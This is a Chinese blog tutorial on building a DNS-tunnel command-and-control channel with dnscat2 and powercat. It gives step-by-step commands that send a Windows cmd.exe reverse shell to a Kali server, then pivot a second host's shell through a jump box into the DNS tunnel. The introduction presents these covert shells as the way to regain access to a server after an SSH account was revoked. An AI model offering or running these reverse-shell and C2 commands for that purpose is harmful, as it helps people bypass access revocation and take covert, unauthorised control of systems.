ailx10说：这篇是2020年8月之前写的，后来又改过。这次再看 DNS 隧道，我先让 powercat 接 dnscat 服务端，确认 cmd 会话，再多加一台 Windows 跳板，把 TCP 的那一段转进 DNS 通道。从两端变三端以后，内外两段的协议和身份就更容易混，我便把每个会话和连接顺序都记下来。它让我看见“走 DNS”并不是整条链都突然变成同一种通信。测试里还用了显式地址，和真正域名委派又是另一层配置；先把自己做到了哪种模型认清，后面的结果才有位置。

---

今天某部门的领导咨询我，一台ubuntu系统的账号SSH账号被收回了，问有没有办法继续获得那台ubuntu系统的访问权限？这是一个好问题，标准的回答应该是联系IT网络管理员，分配控制访问权限。但是作为一名网络安全研究员，给出的答案那肯定是通过netcat反弹shell，或者通过dnscat建立dns c2隧道，反弹shell之前已经讲过了，今天就来看看dns隧道怎么玩？

---

说实话，dns协议从来就没人让人失望过，我2017年研究生实习的时候，一个同事被分到研究dns协议，看着他搭建dns服务器，小心翼翼的配置域名信息。还暗自庆幸，幸好这块不是我研究。这个同事并不喜欢网络安全，他只是找不到好工作，不得已从事这个行业而已，如今3年过去了，他已经入职某为的云计算部门了，他说云计算更赚钱，他就去了。

我上学的时候并没有好好学习，直到2018年我在做美国雪城大学的网络安全实验的时候，才算真正面对DNS协议，我写了2篇文章，算是我和DNS的初次碰撞。

- [什么是本地DNS攻击？](/posts/a0021/)
- [什么是远程DNS攻击？](/posts/a0022/)

后来2019年加入态势感知，负责设计基础网络威胁检测的时候，再次面临DNS隧道和DGA域名检测的任务，当时AI研究院的同事需要造DNS隧道数据，于是我通过iodine第一次搭建了DNS隧道，抓包获得第一手DNS隧道报文，有关搭建iodine DNS隧道可以戳下链接。

## 第一步：在kali rolling上安装好dnscat2的服务端程序

- 我在kali rolling下直接安装就成功了
- 如果是ubuntu18还是需要填一些坑的，不过也是很顺利的，参考官网使用指南
- 服务端是需要ruby的，主要的坑就在ruby的安装上，剩下的都很简单了

```
https://github.com/iagox86/dnscat2

$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/server/
$ gem install bundler
$ bundle install
```

![](/notes-assets/4edcdd9d8b0869df9ab6.jpg)

## 第二步：在kali rolling上启动服务端程序

```
ruby dnscat2.rb ttpowercat.test -e open --no-cache
```

![](/notes-assets/1a0773d7182795043abd.jpg)

## 第三步：在windows7上启动powercat，将shell反弹给kali rolling

```
powercat -c 192.168.160.140 -p 53 -dns ttpowercat.test -e cmd.exe
```

![](/notes-assets/001468b237f8b1ac936f.webp)

## 第四步：去kali rolling上见证奇迹，成功

![](/notes-assets/41e0d27c519a7279b4aa.jpg)

我们在前几天，刚刚做了一个内网跳板机实验，当时是基于TCP的netcat（linux）和powercat（windows）做的，忘记的小伙伴，可以戳下面这个链接，回忆一下。

这块我们要基于DNS的powercat（windows）和基于DNS的dnscat（linux），做一个有趣的跳板机实验，DNS协议从来就不会让人失望。

## 第一步：在跳板机windows7（ailx00）上监听11111端口

```
powercat -l -p 11111 -r dns:192.168.160.140::hackbiji.ailx
```

![](/notes-assets/f50b0f0849a492dec4ab.webp)

## 第二步：在kali rolling上启动dnscat

```
ruby dnscat2.rb hackbiji.ailx -e open --no-cache
```

![](/notes-assets/f1ca131886ccd8e75130.jpg)

## 第三步：在目标主机windows7（ailx01）上反弹shell

```
powercat -c 192.168.160.135 -p 11111 -v -e cmd.exe
```

![](/notes-assets/f8ad95144186f4618cfe.webp)

## 第四步：去kali rolling上见证奇迹，成功经过跳板控制ailx01

session -i 1
whoami
